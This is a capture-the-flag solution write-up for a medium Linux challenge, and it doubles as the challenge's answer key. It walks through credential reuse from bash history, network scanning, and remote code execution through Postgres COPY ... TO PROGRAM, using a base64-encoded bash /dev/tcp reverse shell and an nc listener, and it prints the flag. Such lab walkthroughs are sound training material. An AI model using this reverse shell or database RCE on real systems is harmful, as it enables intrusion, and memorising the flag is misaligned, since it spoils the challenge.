---
title: escape
category: linux
difficulty: medium
points: 100-500
author: z4k1
date: 2026-11-06
---
# escape — solution

Attack path (all steps verified by `solution/verify_solution.sh`):

## 1. Enumerate the entry box

```sh
capsh --print     # cap_net_admin — tempting, useless. Nothing can use it.
cat ~/.bash_history
```

`~/.bash_history` contains:

```
psql -h <??????????????> -U appuser -d appdb # pass: devpass123
```

Credentials for `appuser` / `devpass123`; the host is masked — find it
yourself. (`.README` deliberately pushes `capsh` as the first thing to
try. Don't waste the first hour: the capability leads nowhere.)

## 2. Find the database host

The two containers share one internal network, but the platform's
instancer does not register service-name aliases — only the manifest
`Hostname` values resolve: `entry-host` (you) and `db-host` (the db).
Both are on the same subnet you're on, so recon is straightforward:

```sh
ip route get 8.8.8.8        # learn your subnet (e.g. 172.31.0.0/16 — it is *not* 172.20.0.0/24)
nmap -sn <your-subnet>      # entry-host (you) + db-host
nmap -p 5432 <db-host>      # postgres — or just: getent hosts db-host
```

The `db` host answers on 5432 — postgres. Connect (one session per
command; you will need a second one in step 5):

```sh
PGPASSWORD=devpass123 psql -h <db-ip> -U appuser -d appdb
\dt                    -- two tables: logs, maintenance_notes
SELECT note FROM maintenance_notes;
```

The note mentions `appuser`'s leftover `SUPERUSER` and `COPY TO
PROGRAM`, and ends with a bracketed base64 blob:

```
[J2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTcyLjIwLjAuMTAvNDQ0NCAwPiYxIic=]
```

## 3. Decode and flip the listener IP

```sh
echo 'J2Jhc2ggLWMg...=' | base64 -d
# bash -c "bash -i >& /dev/tcp/<entry-ip>/4444 0>&1"
```

The blob points back at the **entry** host — i.e. the machine you are
already on. Replace the IP with your entry host's current IP (it is
dynamic on the platform), and keep the Blob quoting as-is; `COPY ...
TO PROGRAM` passes the string to `sh -c` verbatim.

## 4. Two sessions: listen on entry, fire the SQL

Session A (entry host):

```sh
nc -lvnp 4444
```

Session B (entry host — this is the RCE trigger):

```sh
PGPASSWORD=devpass123 psql -h <db-ip> -U appuser -d appdb \
  -c "COPY (SELECT 1) TO PROGRAM $PAYLOAD"
```

`COPY ... TO PROGRAM` runs the payload *inside the db container*, and
thanks to `pg_execute_server_program` the `appuser` role may do that
without any OS access at all.

## 5. Land on db, find the flag

The reverse shell connects back to your `nc`, and you are now the
`postgres` **OS user on the db host** (`uid=102(postgres)` — not
`appuser`, not root). Your earlier recon is wrong if it assumed root:
the flag file is root-owned but world-readable, planted by whatever
"sysadmin" wrote that note.

```sh
id                                        # uid=102(postgres)
find / -name flag.txt 2>/dev/null         # /usr/local/.sys_cache_7f3a2b/flag.txt
cat /usr/local/.sys_cache_7f3a2b/flag.txt
```

```
ingehack{b3st_c0nt41n3r_3sc4p3_pr0ud_0f_u}
```

Result: **PASS**.
